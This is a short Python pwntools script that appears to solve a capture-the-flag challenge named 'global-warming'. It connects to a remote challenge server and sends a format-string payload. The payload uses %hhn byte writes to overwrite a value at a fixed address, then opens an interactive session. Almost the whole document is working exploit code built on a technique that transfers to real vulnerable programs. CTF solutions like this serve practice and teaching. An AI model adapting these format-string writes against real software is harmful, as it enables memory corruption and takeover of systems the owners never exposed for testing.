

from pwn import *
#p = process('./global-warming')

p = remote('chall.csivit.com',30023)
admin1 = 0x804c02c
admin2 = admin1 +1
admin3 = admin1 +2
admin4 = admin1 +3
#goal = 0x b4 db ab e3


write_to_1st_byte = p32(admin2)+p32(admin4)+p32(admin3)+p32(admin1)+'%155c'+'%12$hhn'+'%9c'+'%13$hhn'+'%39c'+'%14$hhn'+'%8c'+'%15$hhn'


payload= ''
payload += write_to_1st_byte
p.sendline(payload)
p.interactive()